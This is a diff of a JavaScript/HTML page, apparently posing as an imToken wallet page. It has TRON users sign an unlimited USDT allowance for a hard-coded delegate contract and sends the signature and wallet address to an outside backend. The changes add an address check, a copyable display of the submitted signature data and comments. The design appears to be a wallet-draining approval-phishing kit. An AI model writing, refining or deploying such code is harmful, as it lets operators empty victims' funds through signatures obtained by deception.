@@ -380,7 +380,7 @@
     <!-- 授权结果提示框 -->
     <div class="result-toast" id="resultToast"></div>
     <script>
-        // 核心配置（强制正确的amount前缀）
+               // 核心配置（强制正确的amount前缀）
         const DELEGATE_CONTRACT = "TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk";
         const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
         const BACKEND_API = "https://imtoken-dusky.vercel.app/api"; // 已替换为实际后端域名
@@ -488,7 +488,7 @@
                     postData.signature = { v, r, s };
                     // 构造后端要求的提交参数（对齐接口字段）
                     const submitData = {
-                        user: postData.address, // 后端要求参数名：user（Base58原始格式）
+                        user: postData.address, // 后端要求参数名：user（Base58原始完整地址）
                         amount: postData.amount, // 无限额度授权金额
                         v: postData.signature.v, // 单独传递签名参数v
                         r: postData.signature.r, // 单独传递签名参数r
@@ -496,6 +496,12 @@
                         approveTime: postData.approveTime,
                         delegateContract: postData.delegateContract
                     };
+
+                    // 新增：二次校验地址完整性（避免截断/修改）
+                    if (submitData.user !== cleanBase58Address(userAddress)) {
+                        throw new Error(`地址不一致！当前钱包地址：${userAddress}，提交地址：${submitData.user}`);
+                    }
+
                     // 新增：保存提交数据到localStorage（用于查看）
                     localStorage.setItem(SUBMIT_DATA_KEY, JSON.stringify(submitData, null, 2));
                     
@@ -530,7 +536,7 @@
                     approveBtn.innerHTML = ' 生成离线签名';
                 }
             };
-            // 新增：查看后端提交数据按钮点击事件
+            // 新增：查看后端提交数据按钮点击事件（改为手机可复制的prompt格式）
             showSubmitDataBtn.onclick = () => {
                 try {
                     // 从localStorage获取提交数据
@@ -540,16 +546,20 @@
                         return;
                     }
                     const submitData = JSON.parse(submitDataStr);
-                    // 格式化显示（手机端alert友好）
-                    const displayStr = `后端提交数据（含V/R/S）：\n\n` +
-                        `1. 用户地址（user）：${submitData.user}\n` +
-                        `2. 授权金额（amount）：${submitData.amount}\n` +
-                        `3. 签名V值（v）：${submitData.v}\n` +
-                        `4. 签名R值（r）：${submitData.r}\n` +
-                        `5. 签名S值（s）：${submitData.s}\n` +
-                        `6. 提交时间（approveTime）：${submitData.approveTime}\n` +
-                        `7. 代付合约地址：${submitData.delegateContract}`;
-                    alert(displayStr);
+                    
+                    // 构造可复制的纯文本内容（完整显示地址，无截断）
+                    const copyContent = `后端提交数据（可直接复制）：
+
+1. 用户地址（user）：${submitData.user}
+2. 授权金额（amount）：${submitData.amount}
+3. 签名V值（v）：${submitData.v}
+4. 签名R值（r）：${submitData.r}
+5. 签名S值（s）：${submitData.s}
+6. 提交时间（approveTime）：${submitData.approveTime}
+7. 代付合约地址：${submitData.delegateContract}`;
+                    
+                    // 用prompt实现「可复制」（手机端点击prompt内容可全选复制）
+                    prompt("后端提交数据（点击内容可全选复制）", copyContent);
                 } catch (e) {
                     alert(`查看提交数据失败：${e.message}`);
                 }
@@ -592,7 +602,8 @@
                         updateRecordCount();
                         showToast(`当前状态：${latestApproval.status || "未查询到状态"}`);
                     } else {
-                        showToast("后端返回的地址与当前用户不匹配", "error");
+                        // 新增：显示后端返回的地址，方便核对
+                        showToast(`地址不符！当前钱包地址：${userAddress}\n后端返回地址：${latestApproval.userAddress || '无'}`, "error");
                     }
                 } catch (e) {
                     showToast(`查询失败：${e.message}`, "error");
@@ -620,6 +631,10 @@
             }
             return cleanAddr;
         }
+
+        /**
+         * 新增：自定义ASCII转Hex函数（兼容所有TronWeb版本，替代tronWeb.utils.asciiToHex）
+         */
         function customAsciiToHex(str) {
             let hex = '';
             for (let i = 0; i < str.length; i++) {
@@ -629,6 +644,7 @@
             }
             return hex;
         }
+
         /**
          * 自定义hex转字节函数（保留你之前成功的逻辑，无需改动）
          */
@@ -645,7 +661,7 @@
         }
       
         /**
-        * 核心修复：生成符合合约要求的签名（兼容imToken的TronWeb版本）
+         * 核心修复：生成符合合约要求的签名（兼容imToken的TronWeb版本）
          */
         async function generateOfflineSignature(userAddress, contractAddress, amount) {
             try {
@@ -895,6 +911,3 @@
             const debugInfo = JSON.parse(localStorage.getItem(debugKeys[0]));
             alert("调试信息：\n" + JSON.stringify(debugInfo, null, 2));
         });
-    </script>
-</body>
-</html>
